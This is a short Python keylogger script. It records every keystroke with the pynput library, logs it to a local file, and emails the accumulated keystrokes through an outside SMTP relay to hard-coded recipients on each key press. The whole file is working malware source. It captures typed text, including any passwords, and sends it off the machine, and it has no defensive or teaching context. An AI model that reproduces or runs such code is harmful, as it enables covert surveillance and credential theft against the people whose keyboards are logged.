import pynput
from pynput import keyboard
import smtplib
import logging

print("Started keylogging")
# Email credentials
username = "SMTP_USERNAME"
password = "SMTP_KEY"
recipient = ["recipient1@gmail.com","recipient2@gmail.com"]

message = """From: From Person <Google>
To: To Person <awsservices>
Subject: Key Logger output

logged keys:
"""
log = ""
log_dir = ""

logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')
print("Defined methods")
def on_press(key):
    global log
    try:
        current_key = str(key.char)
    except AttributeError:
        if key == key.space:
            current_key = " "
        else:
            current_key = " " + str(key) + " "
    log = log + current_key
    logging.info(str(log))
    send_log()

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def send_log():
    server = smtplib.SMTP('smtp-relay.sendinblue.com', 587)
    server.starttls()
    server.login(username, password)
    server.sendmail(username, recipient, message+log)
    server.quit()

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    
    listener.join()
    
#send_log()
print("sent logs to the defined recipient")


